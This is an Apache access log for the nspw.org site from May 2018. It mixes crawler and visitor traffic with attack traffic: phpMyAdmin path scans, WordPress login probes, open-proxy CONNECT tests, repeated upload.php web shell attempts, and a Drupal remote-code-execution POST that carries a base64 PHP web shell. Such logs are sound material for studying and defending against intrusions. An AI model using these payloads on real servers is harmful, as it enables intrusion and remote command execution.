www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:24 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:24 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:24 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:24 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:24 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:25 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:25 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:25 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:25 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:25 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:26 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:27 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:28 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:29 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:30 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:31 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:31 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 41.211.107.15 - - [01/May/2018:15:18:31 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 ::1 - - [01/May/2018:15:18:38 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:15:18:59 -0400] "GET /2009/proceedings/1998/nspw1998-jonsson.pdf HTTP/1.1" 302 613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:15:19:05 -0400] "GET /2004/?C=D;O=A HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:15:19:55 -0400] "GET /2005/PC/ritesh%20tiwari.pdf HTTP/1.1" 302 583 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:15:20:03 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:20:44 -0400] "GET /2009/proceedings/1994/nspw1994-dobson.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 174.28.97.160 - - [01/May/2018:15:20:51 -0400] "GET /2017 HTTP/1.1" 302 537 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 ::1 - - [01/May/2018:15:21:05 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:21:06 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:21:07 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 5.9.94.207 - - [01/May/2018:15:21:22 -0400] "GET /2014/program HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 107) AppleWebKit/534.48.3 (KHTML like Gecko) Version/5.1 Safari/534.48.3"
www.nspw.org:80 86.137.107.202 - - [01/May/2018:15:21:23 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
www.nspw.org:80 88.198.43.207 - - [01/May/2018:15:21:24 -0400] "GET /node/70 HTTP/1.1" 302 543 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
www.nspw.org:80 222.217.32.245 - - [01/May/2018:15:21:51 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:21:55 -0400] "GET /2009/proceedings/2010/nspw2010-maxion.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:22:41 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 199.59.150.180 - - [01/May/2018:15:24:28 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.59.150.180 - - [01/May/2018:15:24:28 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 176.88.0.179 - - [01/May/2018:15:24:58 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 176.88.0.179 - - [01/May/2018:15:25:00 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 85.21.233.164 - - [01/May/2018:15:27:06 -0400] "CONNECT api.ipify.org:443 HTTP/1.1" 302 475 "-" "Go-http-client/1.1"
www.nspw.org:80 85.21.233.164 - - [01/May/2018:15:27:18 -0400] "CONNECT api.ipify.org:443 HTTP/1.1" 302 475 "-" "Go-http-client/1.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:15:28:31 -0400] "GET /2006/tmp/?C=M;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 157.55.39.28 - - [01/May/2018:15:28:39 -0400] "GET /robots.txt HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 196.210.21.246 - - [01/May/2018:15:28:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 196.210.21.246 - - [01/May/2018:15:28:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 89.154.203.39 - - [01/May/2018:15:28:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 89.154.203.39 - - [01/May/2018:15:28:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:28:59 -0400] "GET /2009/proceedings/2002/nspw2002-haldar.pdf HTTP/1.1" 302 611 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 71.208.65.211 - - [01/May/2018:15:29:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.208 - - [01/May/2018:15:29:27 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 71.208.65.211 - - [01/May/2018:15:29:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.149.51 - - [01/May/2018:15:29:48 -0400] "GET /papers/2003/?C=S;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.242 - - [01/May/2018:15:30:34 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:19 -0400] "POST /chat/upload.php HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:19 -0400] "GET /chat/temp/58529.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:21 -0400] "POST /Chat/upload.php HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:21 -0400] "GET /Chat/temp/58529.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:22 -0400] "POST /en/upload.php HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:22 -0400] "GET /en/temp/58529.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:22 -0400] "POST /chat/FlashChat_v608/chat/upload.php HTTP/1.1" 302 543 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:23 -0400] "GET /chat/FlashChat_v608/chat/temp/58529.php HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:24 -0400] "POST /radio/radiochat/upload.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:24 -0400] "GET /radio/radiochat/temp/58529.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:24 -0400] "POST /websci/radio/radiochat/upload.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:25 -0400] "GET /websci/radio/radiochat/temp/58529.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:25 -0400] "POST /o/BhGCe/forums.e-mpire.com/chat/upload.php HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:25 -0400] "GET /o/BhGCe/forums.e-mpire.com/chat/temp/58529.php HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:26 -0400] "POST /cms/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:26 -0400] "GET /cms/chat/temp/58529.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:26 -0400] "POST /chat/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:26 -0400] "GET /chat/chat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:27 -0400] "POST /Chat/Chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:27 -0400] "GET /Chat/Chat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:27 -0400] "POST /live/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:28 -0400] "GET /live/chat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:29 -0400] "POST /smf/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:29 -0400] "GET /smf/chat/temp/58529.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:29 -0400] "POST /Tchate/flashchat/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "GET /Tchate/flashchat/temp/58529.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "POST /~duchen/chat/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "GET /~duchen/chat/temp/58529.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "POST /forum/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "GET /forum/chat/temp/58529.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:30 -0400] "POST /FlashChat_v6.0.8_/chat/upload.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:31 -0400] "GET /FlashChat_v6.0.8_/chat/temp/58529.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:31 -0400] "POST /flashchat/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:31 -0400] "GET /flashchat/chat/temp/58529.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:32 -0400] "POST /social/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:32 -0400] "GET /social/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:32 -0400] "POST /sohbet/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:32 -0400] "GET /sohbet/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:33 -0400] "POST /e-dinar-chat/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:34 -0400] "GET /e-dinar-chat/temp/58529.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:35 -0400] "POST /forums/chat/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:35 -0400] "GET /forums/chat/temp/58529.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:35 -0400] "POST /chat-stjepkovica/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:35 -0400] "GET /chat-stjepkovica/temp/58529.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:36 -0400] "POST /community/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:36 -0400] "GET /community/chat/temp/58529.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:36 -0400] "POST /board/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:36 -0400] "GET /board/chat/temp/58529.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:37 -0400] "POST /roommate/flash_chat/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:37 -0400] "GET /roommate/flash_chat/temp/58529.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:38 -0400] "POST /e107_plugins/onlineinfo_menuupload.php HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:38 -0400] "GET /e107_plugins/onlineinfo_menutemp/58529.php HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:38 -0400] "POST /shbt/upload.php HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:39 -0400] "GET /shbt/temp/58529.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
